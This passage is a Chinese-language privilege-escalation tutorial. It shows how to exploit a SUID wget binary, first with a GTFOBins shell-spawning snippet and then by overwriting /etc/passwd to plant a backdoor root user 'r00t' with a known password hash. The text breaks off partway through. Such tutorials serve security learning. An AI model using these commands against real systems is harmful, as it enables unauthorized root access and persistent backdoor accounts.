<p>另一个有趣的 SUID 二进制文件是 wget，它也需要一些创造性思维才能利用。</p>
<p>让我们跳到 GTFOBins 并查看 <a href="https://gtfobins.github.io/gtfobins/wget/" target="_blank" rel="noopener noreferrer" title="获得">wget</a> 的可用漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190624970-1921527515-6e904acec052335021ab89d4ae70c9f4.png" width="824" height="310" class="img_ev3q"></p>
<p>首先检查 SUID 部分，它表明 <strong>wget</strong> 可以被利用来进入 root shell。</p>
<p>当然，我们将首先测试它，因为它在 SUID 部分。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">TF=$(mktemp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x $TF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo -e &#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27; &gt;$TF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/wget --use-askpass=$TF 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625705-1872196970-dcc195dc36ce325f1513fda7619a6ad3.png" width="581" height="139" class="img_ev3q"></p>
<p>不幸的是，它失败了，因为无法识别 GTFOBins 提供的 <strong>–use-askpass</strong> 开关。</p>
<p>从另一方面来说，我们知道可以尝试其他漏洞，而不仅仅局限于 SUID 漏洞。</p>
<p>那么，让我们看看 GTFOBins 还能提供什么。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625809-528986613-049fc62423d4170a253c0bef5aaff04d.png" width="827" height="489" class="img_ev3q"></p>
<p>通常，在 shell 命令之后，&quot;文件写入 &quot;会是第二个最有趣的发现。但对于 wget，我们应该想想二进制文件通常是用来做什么的，以及设置了 SUID 位之后它的功能会发生什么变化。</p>
<p>由于 <strong>wget</strong> 主要用于下载文件，因此设置 SUID 位意味着任何下载的文件都将归 root 所有。</p>
<p>但是我们如何利用它来进行恶意攻击或提升权限呢？</p>
<p>我们可以利用这一点，通过用恶意副本替换 root 拥有的现有文件来提升权限。</p>
<blockquote>
<p>这应该与文件写入漏洞类似地处理，因为它们本质上是同一件事。</p>
</blockquote>
<p>正如在 <strong>nano</strong> 示例中提到的，当我们有能力以 root 身份写入文件时，我们应该考虑针对一些文件，例如 <strong>/etc/passwd、/etc/shadow、etc/sudoers</strong>。</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="下面开始拼凑碎片然后获得-root"><strong>下面开始拼凑碎片，然后获得 root</strong><a href="#下面开始拼凑碎片然后获得-root" class="hash-link" aria-label="下面开始拼凑碎片然后获得-root的直接链接" title="下面开始拼凑碎片然后获得-root的直接链接">​</a></h3>
<p>对于这个例子，最好编辑 /etc/passwd 文件，因为它是任何人都可读的，这意味着我们可以在利用它之前进行备份。</p>
<p>首先备份 /etc/passwd文件：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /etc/passwd /tmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>备份完成后，我们可以 <strong>cat /etc/passwd</strong> 文件，然后复制其完整内容。</p>
<p>接下来，我们需要回到攻击者的机器并在我们的工作目录中创建一个名为 <strong>passwd</strong> 的文件，然后将内容粘贴到其中。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625334-1961106279-dd8af2cf73f96dcc784b278644041629.png" width="434" height="75" class="img_ev3q"></p>
<p>原始 passwd 文件大小为 2617 字节。将其复制到我们的攻击者机器后，我们可以看到它的大小与原始文件大小相同，说明文件完好无损。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190624327-1906687157-c740a06ce1de6de53a0651461695c1ae.png" width="410" height="96" class="img_ev3q"></p>
<p>现在，我们可以从攻击者的机器向 passwd 文件添加 root 用户。完成后，我们会将其发送回受害者，覆盖当前的 passwd文件。</p>
<p>首先，我们需要使用 openssl 创建一个散列密码 。在这个例子中，我们将保持简单并将密码设置为“password”。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl passwd password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="354" height="64" class="img_ev3q"></p>
<p>运行命令后，我们会得到一个哈希值 <strong>ShuKpZV7v9akI</strong>， 请保留这个值，因为我们在下一个命令中会需要它。</p>
<p>要创建名为 r00t 的第二个 root 用户 ，我们可以在 passwd 文件中添加以下行：  <strong>r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash</strong></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash&#x27; &gt;&gt; ./passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 